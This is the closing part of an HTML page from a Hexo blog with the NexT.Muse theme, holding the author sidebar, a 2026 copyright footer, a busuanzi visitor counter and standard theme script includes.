  <p class="site-author-name" itemprop="name">legend1440</p>
  <div class="site-description" itemprop="description"></div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives/">
        
          <span class="site-state-item-count">15</span>
          <span class="site-state-item-name">日志</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
        <span class="site-state-item-count">2</span>
        <span class="site-state-item-name">分类</span>
      </div>
  </nav>
</div>



      </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

        

<div class="copyright">
  
  &copy; Sun Jan 18 2026 08:00:00 GMT+0800 (GMT+08:00) – 
  <span itemprop="copyrightYear">2026</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">legend1440</span>
</div>
  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://muse.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a> 强力驱动
  </div>

        
<div class="busuanzi-count">
  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
      <span class="post-meta-item-icon">
        <i class="fa fa-user"></i>
      </span>
      <span class="site-uv" title="总访客量">
        <span id="busuanzi_value_site_uv"></span>
      </span>
    </span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
      <span class="post-meta-item-icon">
        <i class="fa fa-eye"></i>
      </span>
      <span class="site-pv" title="总访问量">
        <span id="busuanzi_value_site_pv"></span>
      </span>
    </span>
</div>








      </div>
    </footer>
  </div>

  
  <script src="/lib/anime.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>

<script src="/js/utils.js"></script>

<script src="/js/motion.js"></script>


<script src="/js/schemes/muse.js"></script>


<script src="/js/next-boot.js"></script>




  















  

  

</body>
</html>
